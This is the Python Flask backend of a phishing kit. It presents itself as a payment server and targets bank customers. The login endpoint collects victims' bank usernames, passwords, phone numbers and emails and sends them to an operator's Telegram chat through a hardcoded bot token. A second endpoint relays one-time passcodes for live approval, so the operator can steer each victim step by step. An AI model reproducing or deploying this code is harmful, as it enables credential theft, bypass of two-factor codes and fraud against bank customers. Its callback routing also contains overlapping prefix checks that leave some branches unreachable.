import os
import json
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from threading import Thread
import time

app = Flask(__name__)
CORS(app)  # Habilitar CORS para todas las rutas

# ══════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ══════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8578415094:AAFIbQglTSUmxX3IK4nQfuayvmQfDh-aYjM')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003526160154')
WEBHOOK_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

sessions_db = {}

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.json
        session_id = data.get('sessionId')
        bank = data.get('bank', 'BANCO DESCONOCIDO')
        usuario = data.get('usuario')
        clave = data.get('clave')
        phone = data.get('phone', 'N/A')
        amount = data.get('amount', 'N/A')
        email = data.get('email', 'N/A')
        persona = data.get('persona', 'N/A')

        if not session_id or not usuario or not clave:
            return jsonify({'error': 'Datos incompletos'}), 400

        sessions_db[session_id] = {
            'bank': bank,
            'usuario': usuario,
            'clave': clave,
            'phone': phone,
            'amount': amount,
            'email': email,
            'persona': persona,
            'status': 'waiting',
            'created_at': datetime.now().isoformat(),
            'otp': '',
            'otp_attempts': 0
        }

        message = f"""
🏦 <b>CREDENCIALES — {bank}</b>
━━━━━━━━━━━━━━━━━
👤 <b>Usuario:</b> <code>{usuario}</code>
🔑 <b>Clave:</b> <code>{clave}</code>
📱 <b>Celular:</b> {phone}
💰 <b>Monto:</b> {amount}
📧 <b>Email:</b> {email}
👥 <b>Persona:</b> {persona}
🆔 <b>Sesión:</b> {session_id}
⏰ <b>Timestamp:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━
<i>Selecciona una acción:</i>
"""

        buttons = [
            [
                {'text': '✅ PERMITIR OTP', 'callback_data': f'action_otp_{session_id}'},
                {'text': '❌ RECHAZAR', 'callback_data': f'action_reject_{session_id}'},
            ]
        ]

        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': {'inline_keyboard': buttons}
        }

        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 200:
            print(f'Error enviando a Telegram: {response.text}')

        return jsonify({'success': True, 'sessionId': session_id}), 200

    except Exception as e:
        print(f'Error en /api/login: {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/session/<session_id>', methods=['GET'])
def get_session(session_id):
    try:
        if session_id not in sessions_db:
            return jsonify({'error': 'Sesión no encontrada'}), 404

        session = sessions_db[session_id]
        
        return jsonify({
            'status': session['status'],
            'message': session.get('message', ''),
            'otpLabel': session.get('otpLabel', 'Ingresa el código de 6 dígitos')
        }), 200

    except Exception as e:
        print(f'Error en /api/session: {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/otp', methods=['POST'])
def submit_otp():
    try:
        data = request.json
        session_id = data.get('sessionId')
        otp = data.get('otp')

        if not session_id or not otp:
            return jsonify({'error': 'Datos incompletos'}), 400

        if session_id not in sessions_db:
            return jsonify({'error': 'Sesión no encontrada'}), 404

        session = sessions_db[session_id]
        session['otp'] = otp
        session['otp_attempts'] = session.get('otp_attempts', 0) + 1

        message = f"""
🔐 <b>CÓDIGO OTP RECIBIDO — {session['bank']}</b>
━━━━━━━━━━━━━━━━━
📱 <b>Código:</b> <code>{otp}</code>
👤 <b>Usuario:</b> <code>{session['usuario']}</code>
💰 <b>Monto:</b> {session['amount']}
🆔 <b>Sesión:</b> {session_id}
⏰ <b>Intento:</b> {session['otp_attempts']}
━━━━━━━━━━━━━━━━━
<i>Selecciona una acción:</i>
"""

        buttons = [
            [
                {'text': '✅ CONFIRMAR OTP', 'callback_data': f'action_otp_confirm_{session_id}'},
                {'text': '❌ RECHAZAR OTP', 'callback_data': f'action_otp_reject_{session_id}'},
            ]
        ]

        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': {'inline_keyboard': buttons}
        }

        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 200:
            print(f'Error enviando OTP a Telegram: {response.text}')

        return jsonify({'success': True}), 200

    except Exception as e:
        print(f'Error en /api/otp: {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/callback', methods=['POST'])
def handle_callback():
    try:
        update = request.json
        
        if 'callback_query' not in update:
            return jsonify({'ok': True}), 200

        callback_query = update['callback_query']
        callback_data = callback_query.get('data', '')
        callback_id = callback_query.get('id')

        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
            json={'callback_query_id': callback_id, 'text': 'Procesado'}
        )

        if callback_data.startswith('action_otp_'):
            session_id = callback_data.replace('action_otp_', '').replace('action_otp_confirm_', '').replace('action_otp_reject_', '')
            if session_id in sessions_db:
                if 'confirm' in callback_data:
                    sessions_db[session_id]['status'] = 'otp'
                    sessions_db[session_id]['message'] = 'Ingresa tu código OTP'
                elif 'reject' in callback_data:
                    sessions_db[session_id]['status'] = 'error_login'
                    sessions_db[session_id]['message'] = 'Credenciales rechazadas'

        elif callback_data.startswith('action_reject_'):
            session_id = callback_data.replace('action_reject_', '')
            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'error_login'
                sessions_db[session_id]['message'] = 'Login rechazado por el operador'

        elif callback_data.startswith('action_otp_confirm_'):
            session_id = callback_data.replace('action_otp_confirm_', '')
            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'finalizar'
                sessions_db[session_id]['message'] = 'Pago procesado correctamente'

        elif callback_data.startswith('action_otp_reject_'):
            session_id = callback_data.replace('action_otp_reject_', '')
            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'otp_error'
                sessions_db[session_id]['message'] = 'Código OTP rechazado'

        return jsonify({'ok': True}), 200

    except Exception as e:
        print(f'Error en /api/callback: {str(e)}')
        return jsonify({'ok': True}), 200


@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'active',
        'timestamp': datetime.now().isoformat(),
        'sessions_count': len(sessions_db)
    }), 200


@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'app': 'Alcanos Payment Server',
        'version': '1.0.0',
        'status': 'running',
        'endpoints': {
            'POST /api/login': 'Enviar credenciales',
            'GET /api/session/<id>': 'Polling de estado',
            'POST /api/otp': 'Enviar OTP',
            'POST /api/callback': 'Webhook de Telegram',
            'GET /api/health': 'Health check'
        }
    }), 200


def keep_alive():
    while True:
        try:
            time.sleep(10 * 60)
            requests.get(f'http://localhost:5000/api/health', timeout=5)
            print(f'[KEEP-ALIVE] Ping a las {datetime.now().strftime("%H:%M:%S")}')
        except Exception as e:
            print(f'[KEEP-ALIVE] Error: {str(e)}')


if __name__ == '__main__':
    keep_alive_thread = Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
